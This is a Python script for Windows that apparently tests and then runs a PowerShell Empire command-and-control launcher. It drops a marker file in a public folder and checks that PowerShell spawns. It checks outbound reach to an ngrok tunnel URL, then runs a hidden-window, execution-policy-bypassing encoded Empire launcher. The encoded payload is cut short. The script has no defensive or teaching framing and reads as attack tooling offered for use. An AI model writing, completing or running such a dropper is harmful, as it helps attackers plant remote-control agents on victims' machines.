import subprocess, os, sys

# 1. Drop a file to prove Python ran
with open(r"C:\Users\Public\python_ran.txt", "w") as f:
    f.write(f"Python executed at {__import__('datetime').datetime.now()}\n")
    f.write(f"Python version: {sys.version}\n")

# 2. Test if PowerShell even spawns
ps_test = subprocess.run(
    "powershell -Command Write-Output PS_WORKS",
    shell=True,
    capture_output=True
)
with open(r"C:\Users\Public\python_ran.txt", "a") as f:
    f.write(f"PowerShell stdout: {ps_test.stdout}\n")
    f.write(f"PowerShell stderr: {ps_test.stderr}\n")
    f.write(f"PowerShell returncode: {ps_test.returncode}\n")

# 3. Test outbound connectivity to ngrok
curl_test = subprocess.run(
    "powershell -Command Invoke-WebRequest -Uri https://immunize-departure-backwash.ngrok-free.dev/ -UseBasicParsing -TimeoutSec 10",
    shell=True,
    capture_output=True
)
with open(r"C:\Users\Public\python_ran.txt", "a") as f:
    f.write(f"Curl returncode: {curl_test.returncode}\n")
    f.write(f"Curl stdout (first 200 chars): {curl_test.stdout[:200]}\n")
    f.write(f"Curl stderr (first 200 chars): {curl_test.stderr[:200]}\n")

# 4. Now attempt the actual Empire launcher
launcher = r"""powershell -noP -sta -w 1 -ExecutionPolicy Bypass -enc SQBmACgA..."""
result = subprocess.run(launcher, shell=True, capture_output=True)
with open(r"C:\Users\Public\python_ran.txt", "a") as f:
    f.write(f"Empire launcher returncode: {result.returncode}\n")
    f.write(f"Empire launcher stdout: {result.stdout[:300]}\n")
    f.write(f"Empire launcher stderr: {result.stderr[:300]}\n")
